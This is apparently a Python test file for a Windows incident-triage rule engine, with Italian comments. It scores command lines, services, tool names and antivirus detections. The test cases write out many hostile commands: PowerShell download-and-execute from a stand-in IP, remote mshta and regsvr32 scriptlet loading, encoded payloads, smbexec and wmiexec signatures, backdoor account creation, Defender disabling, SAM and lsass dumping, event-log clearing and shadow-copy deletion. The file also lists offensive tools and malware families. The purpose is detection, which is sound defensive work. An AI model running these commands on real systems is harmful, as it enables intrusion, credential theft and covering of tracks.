# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# La valutazione delle righe di comando (tc_regole.valuta_comando) e delle voci di persistenza:
# falsi "decisivi" da evitare e forme d'attacco da riconoscere.
import time
import tc_regole as R
import tc_c_registro as CR
sbagliati = [0]
def verifica(cosa, ottenuto, atteso):
    if ottenuto != atteso:
        sbagliati[0] += 1
        print (u'DIVERSO %s: ottenuto %r, atteso %r' % (cosa, ottenuto, atteso)).encode('utf-8')
b64 = u'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
livelli = [
    (u'curl.exe -fsS https://hc-ping.com/abc-def', 1),
    (u'curl.exe -o C:\\Users\\Public\\a.exe http://1.2.3.4/a.exe', 3),
    (u'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\ddns.ps1', 0),
    (u'powershell -c "Invoke-RestMethod https://api.ddns.example/update?h=x"', 2),
    (u'powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process notepad"', 0),
    (u'powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://1.2.3.4/a\'))"', 3),
    (u'powershell -c "irm get.scoop.sh | iex"', 0),
    (u'powershell -c "irm https://get.scoop.sh | iex"', 0),
    (u'powershell -c "irm http://1.2.3.4/x.ps1 | iex"', 3),
    (u'powershell -enc ' + b64, 3),
    (u'powershell -en ' + b64, 3),
    (u'powershell.exe -WindowStyle Hidden -File "C:\\Program Files\\Backup\\run.ps1"', 0),
    (u'regsvr32 /s /n /i:/UserInstall themeui.dll', 0),
    (u'regsvr32 /s /n /u /i:http://1.2.3.4/a.sct scrobj.dll', 3),
    (u'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc""")', 3),
    (u'mshta http://1.2.3.4/a.hta', 3),
    (u'mshta "C:\\Program Files\\App\\help.hta"', 0),
    (u'cmd/c powershell -enc ' + b64, 3),
    (u'cmd.exe /c start https://www.example.com/', 0),
    (u'C:\\Users\\Public\\pythonw.exe rat.py', 2),
    (u'C:\\Users\\Public\\powershell.exe -c x', 2),
    (u'C:\\Users\\bob\\AppData\\Local\\Programs\\Python\\Python311\\python.exe app.py', 0),
    (u'\\\\?\\C:\\Users\\Public\\a.exe', 2),
    (u'\\\\10.1.2.3\\share\\a.exe', 2),
    (u'\\\\fileserver\\apps\\tool.exe /start', 1),
    (u'wmic process call create "powershell -enc ' + b64 + u'"', 3),
    (u'C:\\Windows\\svchost.exe -k netsvcs', 2),
    (u'C:\\Windows\\System32\\svchost.exe -k netsvcs', 0),
    (u'C:\\Windows\\Sysnative\\cmd.exe /c echo ok', 0),
    (u'"C:\\Program Files\\X\\dllhost.exe"', 2),
    (u'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)', 3),
    (u'C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL', 0),
    (u'cmd.exe /c echo abcdef > \\\\.\\pipe\\abcdef', 3),
    (u'cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000.12 2>&1', 3),
    (u'C:\\Windows\\System32\\spool\\drivers\\color\\x.exe', 2),
    (u'schtasks /create /tn x /tr "powershell -enc ' + b64 + u'" /sc onlogon', 3),
    (u'msiexec /q /i https://1.2.3.4/a.msi', 3),
    (u'msiexec /i C:\\setup\\app.msi', 0),
    (u'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 0),
    (u'C:\\Users\\bob\\AppData\\Local\\Temp\\setup.exe', 2),
]
for riga, atteso in livelli:
    verifica(u'livello di ' + riga[:70], R.valuta_comando(riga).livello, atteso)
t0 = time.time()
R.valuta_comando(u'cmd.exe /c start' + u' ' * 30000 + u'x http://a')
verifica(u'tempo su "start" con 30000 spazi sotto 5 secondi', time.time() - t0 < 5.0, True)
# nomi senza estensione
verifica(u'nome normalizzato', R.valuta_comando(u'cmd /c dir').nome, u'cmd.exe')
verifica(u'chisel senza estensione', R.strumento(u'chisel')[0], R.DECISIVO)
verifica(u'nc senza estensione', R.strumento(u'nc')[0], R.DA_CONFERMARE)
# strumenti e famiglie
for nome, peso, famiglia in ((u'PsExec.exe', 2, R.F_DOPPIO_USO), (u'PSEXESVC.exe', 2, R.F_LATERALE), (u'procdump64.exe', 2, R.F_DOPPIO_USO),
                             (u'sdelete.exe', 2, R.F_DOPPIO_USO), (u'nmap.exe', 2, R.F_DOPPIO_USO), (u'ncat.exe', 2, R.F_DOPPIO_USO),
                             (u'GarminMapInstall.exe', 0, None), (u'zenmap.exe', 0, None), (u'PowerViewer.exe', 0, None),
                             (u'powerview.ps1', 3, R.F_STRUMENTI), (u'mimikatz.exe', 3, R.F_STRUMENTI), (u'MEGAsyncSetup64.exe', 2, R.F_DOPPIO_USO),
                             (u'nmap-7.94-setup.exe', 2, R.F_DOPPIO_USO), (u'Advanced_IP_Scanner_2.5.exe', 2, R.F_DOPPIO_USO),
                             (u'wmiexec.exe', 3, R.F_LATERALE), (u'notepad.exe', 0, None), (u'rclone.exe', 2, R.F_DOPPIO_USO)):
    verifica(u'peso di ' + nome, R.strumento(nome)[0], peso)
    if famiglia:
        verifica(u'famiglia di ' + nome, R.famiglia_strumento(nome), famiglia)
# firme di smbexec
smb = u'%COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat'
for nome, percorso, atteso in ((u'BTOBTO', u'x', R.DECISIVO), (u'x', smb, R.DECISIVO), (u'x', u'cmd.exe /c C:\\Windows\\shutdown.bat', R.DA_CONFERMARE),
                               (u'x', u'%COMSPEC% /Q /c %SYSTEMROOT%\\qWeRtYuI.bat', R.DECISIVO), (u'x', u'cmd /c %TEMP%\\execute.bat', R.DA_CONFERMARE),
                               (u'x', u'C:\\Program Files\\App\\svc.exe', None), (u'x', u'C:\\Tools\\execute.bat', None)):
    f = R.firma_smbexec(nome, percorso)
    verifica(u'smbexec ' + percorso[:50], f[0] if f else None, atteso)
# servizi
for nome, percorso, atteso in ((u'Updater', u'cmd /c net user hacker Passw0rd! /add', R.DECISIVO),
                               (u'Updater', u'powershell -c Add-LocalGroupMember Administrators hacker', R.DECISIVO),
                               (u'Updater', u'powershell -c New-LocalUser hacker -NoPassword', R.DECISIVO),
                               (u'Updater', u'cmd /c echo ok', R.DA_CONFERMARE),
                               (u'pmem', u'cmd /c net user hacker Passw0rd! /add', R.DECISIVO),
                               (u'abcdef', u'cmd.exe /c echo abcdef > \\\\.\\pipe\\abcdef', R.DECISIVO),
                               (u'Spooler', u'C:\\Windows\\System32\\spoolsv.exe', 0),
                               (u'x', smb, R.DECISIVO),
                               (u'RunOnceSys', u'cmd.exe /c C:\\Windows\\shutdown.bat', R.DA_CONFERMARE),
                               (u'PSEXESVC', u'%SystemRoot%\\PSEXESVC.exe', R.DA_CONFERMARE),
                               (u'KjHgFdSa', u'%SystemRoot%\\KjHgFdSa.exe', R.DA_CONFERMARE),
                               (u'Tool', u'C:\\Users\\Public\\svc.exe', R.DA_CONFERMARE),
                               (u'Enc', u'powershell.exe -nop -w hidden -enc ' + b64, R.DECISIVO),
                               (u'VMTools', u'"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"', 0)):
    verifica(u'servizio ' + percorso[:50], CR.giudica_servizio(nome, percorso)[0], atteso)
verifica(u'famiglia del servizio PSEXESVC', CR.giudica_servizio(u'PSEXESVC', u'%SystemRoot%\\PSEXESVC.exe')[2], R.F_LATERALE)
# antivirus
for nome, atteso in ((u'HackTool:Win32/CrackMapExec', 3), (u'HackTool:Win32/Keygen', 1), (u'Exploit:O97M/CVE-2017-11882.A', 2),
                     (u'PUA:Win32/Presenoker', 1), (u'Trojan:Win32/Wacatac.B!ml', 2), (u'Backdoor:PHP/Remoteshell.V', 3),
                     (u'Virus:DOS/EICAR_Test_File', 1), (u'HackTool:Win32/Mimikatz.D', 3), (u'Ransom:Win32/Conti', 3),
                     (u'HackTool:Win32/AutoKMS', 1), (u'Trojan:JS/SharpShooter.A', 2), (u'Backdoor:PowerShell/Powercat.A', 3)):
    verifica(u'minaccia ' + nome, R.peso_minaccia(nome), atteso)
# PowerShell
for testo, atteso in ((u'Get-MpPreference | select DisableRealtimeMonitoring', None), (u'Set-MpPreference -DisableRealtimeMonitoring $false', None),
                      (u'Set-MpPreference -DisableRealtimeMonitoring $true', 2),
                      (u'New-ItemProperty -Path HKLM:\\x -Name DisableAntiSpyware -Value 1', 2),
                      (u'Add-MpPreference -ExclusionPath C:\\Temp', 2), (u'Invoke-Mimikatz', 3)):
    g = R.ps_sospetto(testo)
    verifica(u'powershell ' + testo[:50], g[0] if g else None, atteso)
# comandi
def pesi(riga):
    return sorted([p for p, _, _ in R.comandi_noti(riga)])
for riga, atteso in ((u'Get-Help Clear-EventLog', []), (u'Clear-EventLog -LogName Security', [3]),
                     (u'cmd /c dir > C:\\Windows\\Temp\\filelist.tmp 2>&1', [2]), (u'cmd.exe /C whoami > C:\\Windows\\Temp\\AbCdEfGh.tmp 2>&1', [3]),
                     (u'curl -o data.json https://api.example.com/x', []), (u'net users hacker x /add', [2]),
                     (u'netsh firewall set opmode disable', [2]), (u'Set-MpPreference -DisableRealtimeMonitoring $false', []),
                     (u'Set-MpPreference -DisableRealtimeMonitoring $true', [2]), (u'reg save hklm\\sam s', [2]),
                     (u'procdump -ma lsass.exe x.dmp', [3])):
    verifica(u'comando ' + riga[:50], pesi(riga), atteso)
# processi di sistema fuori posto
for percorso, atteso in ((u'C:\\Windows\\System32\\svchost.exe', False), (u'C:\\Windows\\svchost.exe', True), (u'C:\\Windows\\explorer.exe', False),
                         (u'C:\\Windows\\SysWOW64\\explorer.exe', False), (u'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', False),
                         (u'C:\\Windows\\Temp\\svchost.exe', True), (u'C:\\Users\\Public\\lsass.exe', True), (u'svchost.exe', False),
                         (u'\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe', False), (u'C:\\Windows\\WinSxS\\amd64_x\\svchost.exe', False),
                         (u'C:\\Program Files\\App\\notepad.exe', False), (u'%SystemRoot%\\system32\\csrss.exe', False),
                         (u'%%SystemRoot%%\\system32\\csrss.exe', False)):
    verifica(u'fuori posto ' + percorso, R.fuori_posto(percorso), atteso)
# indirizzi
verifica(u'IPv6 globale non contato come pubblico', R.ip_pubblico(u'2001:db8::1'), False)
verifica(u'IPv4 pubblico', R.ip_pubblico(u'194.61.24.102'), True)
# --- seconda tornata della revisione
# driver degli strumenti di acquisizione: contano il nome del servizio o del file, per intero
for nome, percorso, atteso in ((u'pmem', u'\\??\\C:\\Users\\x\\AppData\\Local\\Temp\\pme3B5A.tmp', True),
                               (u'winpmem', u'C:\\Tools\\winpmem_x64.sys', True),
                               (u'RamCaptureDriver64', u'C:\\Tools\\RamCaptureDriver64.sys', True),
                               (u'x', u'C:\\Windows\\System32\\drivers\\DumpIt.sys', True),
                               (u'Updater', u'powershell -c Add-LocalGroupMember Administrators hacker', False),
                               (u'pmem', u'cmd.exe /c C:\\Users\\Public\\a.bat', False),
                               (u'Spooler', u'C:\\Windows\\System32\\spoolsv.exe', False)):
    verifica(u'driver forense %s %s' % (nome, percorso[:40]), R.driver_forense(nome, percorso), atteso)
# nomi corti degli strumenti: solo come parola o inizio di parola
for nome, peso in ((u'SecureFilesDelete.exe', 0), (u'sdelete64.exe', 2), (u'sdelete.exe', 2), (u'csexec.exe', 2),
                   (u'csexecsvc.exe', 2), (u'remcomsvc.exe', 2), (u'paexec.exe', 2), (u'PAExec-1234-HOST.exe', 2),
                   (u'ngrok.exe', 2), (u'rclone-v1.66.exe', 2), (u'UNCsExec.exe', 0)):
    verifica(u'peso di ' + nome, R.strumento(nome)[0], peso)
# antivirus: i nomi corti valgono solo come nome intero della famiglia
for nome, atteso in ((u'Trojan:Win32/Cyclops', 2), (u'Trojan:Win32/Conti.A!MTB', 3), (u'Trojan:Win32/Continue.B', 2),
                     (u'Trojan:Win64/Sliver.A', 3), (u'Trojan:Win32/Slivers', 2), (u'Trojan:Win32/Clop.A', 3),
                     (u'Trojan:Win32/RoyalRoad.A', 2), (u'Behavior:Win32/Ryuk.A', 3), (u'Trojan:Win32/Qbot.B', 3),
                     (u'Trojan:Win32/Qakbot.B', 3), (u'Trojan:PowerShell/Empire.A', 3), (u'Trojan:Win32/Empires', 2),
                     (u'Trojan:Win64/CobaltStrike.NP!dha', 3), (u'HackTool:Win64/Mikatz!dha', 3),
                     (u'Trojan:Win32/Wce.A', 3), (u'Trojan:Win32/Glupteba!ml', 2)):
    verifica(u'minaccia ' + nome, R.peso_minaccia(nome), atteso)
# RMM: frammenti corti e nome del profilo
for testo, atteso in ((u'c:\\program files\\syncrosoft\\pos\\h2o\\license control.exe', None),
                      (u'c:\\users\\radmin\\desktop\\a.exe', None), (u'g2a launcher', None),
                      (u'C:\\Users\\anydesk\\Desktop\\notepad.exe', None),
                      (u'C:\\Users\\bob\\Downloads\\AnyDesk.exe', u'AnyDesk'),
                      (u'C:\\Program Files\\RepairTech\\Syncro\\Syncro.Service.exe', u'Syncro'),
                      (u'SyncroLive.Agent.Runner.exe', u'Syncro'), (u'radmin.exe', u'Radmin'), (u'Radmin Server 3', u'Radmin'),
                      (u'Radmin VPN', None), (u'ToDesktop Builder', None), (u'ToDesk_Service.exe', u'ToDesk'),
                      (u'todesk.exe', u'ToDesk'), (u'parsecd.exe', u'Parsec'), (u'Parsec', u'Parsec'), (u'parsecs.txt', None),
                      (u'SupremoService.exe', u'Supremo'), (u'Supremo.exe', u'Supremo'), (u'AteraAgent.exe', u'Atera'),
                      (u'Atera Networks', u'Atera'), (u'ateralabs.exe', None), (u'action1_agent.exe', u'Action1'),
                      (u'g2ax_service.exe', u'GoTo (GoToAssist, GoTo Resolve, GoToMyPC)'),
                      (u'TeamViewer_Service.exe', u'TeamViewer')):
    verifica(u'RMM ' + testo, R.trova_rmm(testo), atteso)
# comandi: registri eventi, backup, atexec con il % raddoppiato, account con PowerShell
for riga, atteso in ((u'wevtutil cl Application', [2]), (u'wevtutil cl Security', [3]), (u'wevtutil.exe clear-log "Security"', [3]),
                     (u'wevtutil cl System & wevtutil cl Application', [3]),
                     (u'for /F "tokens=*" %1 in (\'wevtutil.exe el\') DO wevtutil.exe cl "%1"', [3]),
                     (u'wevtutil el | Foreach-Object {wevtutil cl "$_"}', [3]),
                     (u'Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }', [3]),
                     (u'Clear-EventLog -LogName Application, System', [3]), (u'Clear-EventLog -LogName Application', [2]),
                     (u'Clear-EventLog "Windows PowerShell"', [2]),
                     (u'Get-WinEvent -ListLog * | % { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }', [3]),
                     (u'wevtutil cl Microsoft-Windows-Security-Mitigations/KernelMode', [2]),
                     (u'wbadmin delete systemstatebackup -keepVersions:3', []), (u'wbadmin delete systemstatebackup -keepVersions:0', [2]),
                     (u'wbadmin delete catalog -quiet', [2]), (u'wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest', [2]),
                     (u'vssadmin delete shadows /all /quiet', [2]),
                     (u'cmd.exe /C whoami > %%windir%%\\Temp\\AbCdEfGh.tmp 2>&1', [3]),
                     (u'cmd.exe /C whoami > %windir%\\Temp\\AbCdEfGh.tmp 2>&1', [3]),
                     (u'New-LocalUser -Name hacker -NoPassword', [2]), (u'Get-Help New-LocalUser', []),
                     (u'Add-LocalGroupMember -Group Administrators -Member hacker', [2]),
                     (u'Add-LocalGroupMember -Group "Backup Operators" -Member svc', []),
                     (u'C:\\Tools\\SecureFilesDelete.exe C:\\x', []), (u'sdelete64.exe -p 3 C:\\x', [2])):
    verifica(u'comando ' + riga[:60], pesi(riga), atteso)
# zone: sottocartelle di System32 scrivibili dagli utenti
for percorso, atteso in ((u'C:\\Windows\\System32\\Tasks\\a.exe', u'sospetta'), (u'C:\\Windows\\System32\\spool\\drivers\\color\\a.exe', u'sospetta'),
                         (u'C:\\Windows\\SysWOW64\\FxsTmp\\a.exe', u'sospetta'), (u'C:\\Windows\\tracing\\a.exe', u'sospetta'),
                         (u'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\unidrv.dll', u'sistema'),
                         (u'C:\\Windows\\System32\\cmd.exe', u'sistema')):
    verifica(u'zona di ' + percorso, R.zona(percorso), atteso)
# orari fuori scala
import tc_base
for valore, atteso in ((0, u''), (-5, u''), (None, u''), (float('nan'), u''), (float('inf'), u''), (1e18, u''),
                       (253402300800.0, u''), (tc_base.filetime_a_epoch(0x7FFFFFFFFFFFFFFF), u''),
                       (1700000000, u'2023-11-14 22:13:20')):
    verifica(u'orario %r' % (valore,), tc_base.testo_orario(valore), atteso)
# interpreti annidati, WebDAV, output passato a un interprete, esecuzione per interposta persona
for riga, atteso in ((u'conhost --headless powershell -c "irm http://1.2.3.4/a | iex"', 3),
                     (u'conhost.exe --headless cmd /c dir', 1), (u'conhost.exe 0x4', 0),
                     (u'cmd /c finger user@1.2.3.4 | cmd', 3), (u'cmd /c type C:\\Scripts\\lista.txt | cmd', 2),
                     (u'cmd /c echo y | chkdsk /f', 0),
                     (u'rundll32 \\\\1.2.3.4@80\\share\\a.dll,Entry', 3),
                     (u'rundll32.exe \\\\files.example.com@SSL\\DavWWWRoot\\a.dll,Run', 3),
                     (u'cmd /c \\\\10.0.0.5\\netlogon\\logon.bat', 2),
                     (u'cmd /c \\\\fileserver\\netlogon\\logon.bat', 0),
                     (u'cmd /c rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)', 3),
                     (u'"C:\\Program Files\\App\\launcher.exe" --run "cmd /c regsvr32 /s /n /u /i:http://1.2.3.4/a.sct scrobj.dll"', 3),
                     (u'"C:\\Program Files\\App\\launcher.exe" --mode cmd --verbose', 0),
                     (u'"C:\\Program Files\\App\\app.exe" -cmd start', 0),
                     (u'C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\cmd.exe /c echo ok', 0),
                     (u'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c calc"', 0),
                     (u'forfiles /p C:\\Logs /s /m *.log /d -30 /c "cmd /c del @path"', 0),
                     (u'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c powershell -enc ' + b64 + u'"', 3),
                     (u'notepad.exe "C:\\docs\\come usare cmd .txt"', 0)):
    verifica(u'livello di ' + riga[:70], R.valuta_comando(riga).livello, atteso)
verifica(u'finestra nascosta', R.finestra_nascosta(u'-nop -w hidden -c calc'), True)
verifica(u'finestra non nascosta', R.finestra_nascosta(u'-nop -c calc'), False)
t0 = time.time()
R.valuta_comando(u'x.exe ' + u'cmd ' * 50000)
R.valuta_comando(u'cmd /c ' + u'\\\\a' * 50000)
R.valuta_comando(u'cmd /c ' + u'| ' * 50000 + u'cmd')
verifica(u'tempo sulle righe lunghe con le regole nuove sotto 20 secondi', time.time() - t0 < 20.0, True)
print 'casi sbagliati: %d' % sbagliati[0]
